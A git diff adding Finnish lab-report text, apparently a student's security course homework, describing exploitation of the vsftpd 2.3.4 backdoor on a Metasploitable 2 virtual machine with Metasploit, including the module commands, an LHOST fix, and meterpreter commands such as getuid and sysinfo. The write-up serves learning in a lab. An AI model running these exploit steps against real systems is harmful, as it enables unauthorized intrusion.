@@ -110,6 +110,31 @@ ________________________________________________________________________________
 
 ### f) Murtaudu Metasploitablen vsftpd-palveluun
 
+Metasploitissa oli valmis exploit kyseiseen palveluun, joten hyökkääminen oli yksinkertaista. Ensin valittiin hyökkäyksen kohteeksi haluttu palvelu, sitten exploit ja asetettiin kohde.
+
+    search vsftpd
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOST <METASPLOITABLE 2 IP-OSOITE>
+    run
+
+Sain kuitenkin virheilmoituksen: _"Msf: OptionValidateError one or more options failed to validate: LHOST."_.
+
+<img width="855" height="147" alt="LHOST OSOITE" src="https://github.com/user-attachments/assets/53e9d76c-161c-49c7-b254-e85140b323d1" />
+
+Tämä johtui siitä, että Metasploitille ei oltu vielä määritetty _Local Host (LHOST)_  IP-osoitetta, eli tässä tapauksessa Kali-koneen osoitetta. Sain määritettyä sen komennolla ```set LHOST <KALIN IP-OSOITE>```. 
+
+Tämän korjauksen jälkeen exploit komennot uudestaan onnistuneesti. 
+
+
+<img width="844" height="149" alt="BACKDOOR HAS SPAWNNED" src="https://github.com/user-attachments/assets/6080dcc4-d739-41cb-a469-10d924955c89" />
+
+Yritin seuraavaksi lähteä hakemaan tietoa kohdekoneesta komennoilla ```whoami``` ja ```hostname```. Nämä eivät kuitenkaan toimineet vaan palauttivat _"Unknown command"_ virheilmoitukset. LÄHDE löytyi, että meterpreter tottelee eri käskyjä:
+
+    getuid
+    sysinfo
+
+<img width="466" height="132" alt="image" src="https://github.com/user-attachments/assets/f188c0ec-380c-46de-ac51-b04f493d340f" />
+
 ________________________________________________________________________________________________________________________________________________________________________________________
 
 
@@ -120,7 +145,11 @@ ________________________________________________________________________________
 
 ### h) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).
 
-________________________________________________________________________________________________________________________________________________________________________________________
+Käyttäjärjestelmä ja käyttäjä oli jo saatu tietoon, joten oli aika lähteä tutkimaan muita hyödyllisiä perustietoja. Ensimmäisenä lähdin selvittämään verkkoyhteyksiä
+
+    ipconfig
+    ________________________________________________________________________________________________________________________________________________________________________________________
+
 
 
 ### i) Demonstroi Meterpretrin ominaisuuksia.
